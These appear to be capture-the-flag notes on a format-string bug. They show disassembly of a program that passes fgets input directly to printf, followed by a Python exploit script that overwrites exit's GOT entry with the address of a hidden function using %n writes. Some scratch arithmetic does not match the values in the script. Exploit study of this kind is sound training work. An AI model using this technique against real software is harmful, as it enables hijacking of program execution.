-------------MAIN------------------
   0x08048504 <+0>:	push   %ebp
   0x08048505 <+1>:	mov    %esp,%ebp
   0x08048507 <+3>:	and    $0xfffffff0,%esp
   0x0804850a <+6>:	call   0x80484c2 <n>
   0x0804850f <+11>:	leave
   0x08048510 <+12>:	ret
-----------------------------------


-------------------N----------------
   0x080484c2 <+0>:	push   %ebp
   0x080484c3 <+1>:	mov    %esp,%ebp
   0x080484c5 <+3>:	sub    $0x218,%esp
   0x080484cb <+9>:	mov    0x8049848,%eax
   0x080484d0 <+14>:	mov    %eax,0x8(%esp)
   0x080484d4 <+18>:	movl   $0x200,0x4(%esp)
   0x080484dc <+26>:	lea    -0x208(%ebp),%eax
   0x080484e2 <+32>:	mov    %eax,(%esp)
   0x080484e5 <+35>:	call   0x80483a0 <fgets@plt>
   0x080484ea <+40>:	lea    -0x208(%ebp),%eax
   0x080484f0 <+46>:	mov    %eax,(%esp)
   0x080484f3 <+49>:	call   0x8048380 <printf@plt>
   0x080484f8 <+54>:	movl   $0x1,(%esp)
   0x080484ff <+61>:	call   0x80483d0 <exit@plt>
------------------------------------

080484a4 g     F .text	0000001e              o

\xa4\x84\x04\x08


84a4 = 33956 - 16 = 33940

10804 - 84c2 = 67588 - 33986 = 33602


exp.py

import struct
import os
O_ADDR = 0x80484a4

EXIT_ADDR = 0x8049838

def pad(s):
    return s+"X"*(512-len(s))

exploit = ""
exploit += struct.pack("I", EXIT_ADDR)
exploit += struct.pack("I", EXIT_ADDR+2)

exploit += "%4$33948x"
exploit += "%4$n"
exploit += "%33632x"
exploit += "%5$n"
print pad(exploit)

